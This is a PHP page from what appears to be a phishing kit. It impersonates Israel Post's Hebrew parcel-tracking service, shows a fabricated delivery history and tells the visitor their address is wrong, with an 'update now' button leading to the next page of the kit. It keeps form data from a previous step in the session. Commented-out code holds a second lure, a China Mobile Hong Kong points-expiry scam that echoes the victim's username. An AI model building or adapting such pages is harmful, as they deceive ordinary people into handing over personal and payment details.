<?php
session_start();
include('header.php');


if (isset($_POST['submit'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw=="
      crossorigin="anonymous" referrerpolicy="no-referrer"/>
<style>
    .wrap.page_two_sr {
        padding: 0 10px;
        text-align: right;
    }

    .wrap.page_two_sr .page-title-sr h1.form-title {
        color: #dd2024;
        font-size: 28px;
        font-weight: 500;
    }

    .form-body-upperText, .form-body-upperText p {
        font-weight: 400;
    }

    .form-group_item-sr {
        display: block;
        width: 100%;
        text-align: right;
    }

    .form-group_item-sr label.requiredField {
        margin-bottom: 5px;
        text-align: right;
        width: 100%;
        display: block;
    }

    .form-group_item-sr input#ItemCode {
        width: 100%;
        display: table;
        max-width: 100%;
        padding: 9px 10px;
        outline: 0;
        border-radius: 7px;
        border: 1px solid #ccc;
    }

    .form-group_item_button button {
        border-color: #d0191f;
        background: #d0191f;
        padding: 4px 20px 4px 20px;
        -webkit-border-radius: 20px;
        -moz-border-radius: 20px;
        border-radius: 20px;
        line-height: 29px;
    }

    .form-group_item_button {
        margin-top: 20px;
        text-align: left;
    }


    @media (max-width: 767px) {
        .submit-btn {
            background-color: #2e80f4;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #2e80f4;
            height: auto;
            cursor: pointer;
        }

        .submit-btn:hover:hover {
            background-color: #003ef7;
            border-color: #003ef7;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }

    .new_h3 {
        color: #d0191f;
        border-bottom: 1px solid #ddd;
        padding-bottom: 7px;
        margin-bottom: 10px;
        padding-top: 20px;
    }

    .new_p {
        border-bottom: 1px solid #ddd;
        padding-bottom: 7px;
        margin-bottom: 10px;
    }

    .main_in p {
        font-size: 14px;
    }

    .main_in a {
        border-color: #d0191f;
        background: #d0191f;
        padding: 4px 70px 4px 70px;
        border-radius: 20px;
        line-height: 29px;
        margin: 60px auto 20px auto;
        display: block;
        width: max-content;
    }

    .main_in h3 {
        font-size: 17px;
    }

    .tracking {
        color: black;
    }
</style>
<div class="wrap page_two_sr">
    <div class="page-title-sr">
        <h1 class="form-title">מעקב משלוחים</h1>
    </div>
    <div class="form-body-upperText"><p>&nbsp;</p>
        <p>&nbsp;</p>
        <p>מידע מקוון על פריטים אשר נשלחו באמצעות דואר שליחים, דואר רשום בפנים הארץ,<br>שירותים לחו"ל ומחו"ל: EMS, ECO
            POST.</p>
    </div>
    <div class="page2-form-sr">
        <form>
            <div class="form-group">
                <!--Field that disable autocomplete in new chrome version-->
                <input style="display:none" type="password" name="fakepasswordremembered">
                <div class="form-group_item-sr">
                    <label class="requiredField" for="ItemCode" title="Enter Item Code">חפש מידע על פריט שמספרו</label>
                    <input autocomplete="off" class="form-control itemTraceItemCode"
                           data-msg-badformat="מספר פריט לא תקין" data-msg-required="חובה להזין מספר פריט" id="ItemCode"
                           maxlength="13" name="ItemCode" type="text" value="">
                </div>
                <div class="form-group_item_button">
                    <button type="button" class="btn btn-primary L" id="btn-ItemCode">חיפוש</button>
                </div>
                <p>כתובת החבילה שלך שגויה, השליח לא יכול למסור אותה כראוי, היא חזרה למחסן הקרוב ביותר, אנא עדכן את
                    הכתובת הנכונה בזמן

                </p>

                <div class="main_in">
                    <a href="/page3.php" class="btn btn-primary L">תעדכן עכשיו


                    </a>
                    <h3 class="new_h3">מידע על פריט מדלת לדלת : <span class="tracking">EE648466695IL</span></h3>

                    <p>27/03/2023</p>
                    <p>התקבל למשלוח והועבר להמשך טיפול</p>
                    <p>סניף מגדל שלום <i class="fa-solid fa-house"></i></p>
                    <p class="new_p">תל אביב-יפו <i class="fa-sharp fa-solid fa-location-dot"></i></p>

                    <p class="new_p">הדואר נמסר ליעדו ב-29 מרץ 2023 באמצעות יחידת הדואר באר יעקב בבליאקוב <i
                                class="fa-sharp fa-solid fa-location-dot"></i></p>

                    <p class="new_p">הדואר נמסר ליעדו ב-2 אַפּרִיל 2023 באמצעות יחידת הדואר רוטשילד 57 בראשון לציון
                        <i class="fa-sharp fa-solid fa-location-dot"></i></p>

                    <p class="new_p">הדואר נמסר ליעדו ביום 05.04.2023 באמצעות יחידת הדואר אברת באפרתה ונמצא כי אינו תואם
                        את פרטי היעד המקבל, וכעת הופסקה המסירה
                        <i class="fa-sharp fa-solid fa-location-dot"></i></p>
                </div>
            </div>
        </form>
    </div>

</div>
<!--<div class="wrap">
    <a href="" class="main-logo">

        積分有效期提示
        <img src="images/logo.png" alt="">
    </a>

    <div class="notice" style="font-size:13px;">

        <p>尊敬的移動客戶：<?php //echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <p>
            MyLink積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p>
        </br>
        <p>
            MyLink積分計劃為您帶來最新、最精彩的優惠，下載MyLink緊貼最新資訊，輕輕鬆鬆就可以賺取MyLink積分！
            積分可用於直接繳付賬單外，更可以兌換多種生活禮品包括超市禮券、咖啡現金券、儲值卡等。
            MyLink積分碼的條款及細則
            除非另有規定，每個MyLink積分只能使用一次。合資格客戶可於商戶發送MyLink積分時所展示之條款及細則查閱其MyLink積分碼之指定兌換有效期。MyLink積分碼必須於指定兌換有效期前，於MyLink兌換成MyLink積分。MyLink積分碼逾期將作廢並自動註銷，且不獲補發或延長兌換有效期。
            </br>
            如有任何爭議，中國移動香港將保留一切最終決定權。
        </p>
    </div>
    <div class="center">
        <a href="page6.php" class="btn submit-btn">積分兌換</a>
    </div>
</div>-->
<!--<div class="loader-wrap">
    <div class="loading">
        <img src="images/china-mobile-logo.png" alt="" class="china-mobile-logo-img">
        <img src="images/ellipsis-loader.gif" alt="">
    </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    setTimeout(() => {
        jQuery('.loader-wrap').hide();
    }, 3000);
</script>-->
<?php
include('footer.php');
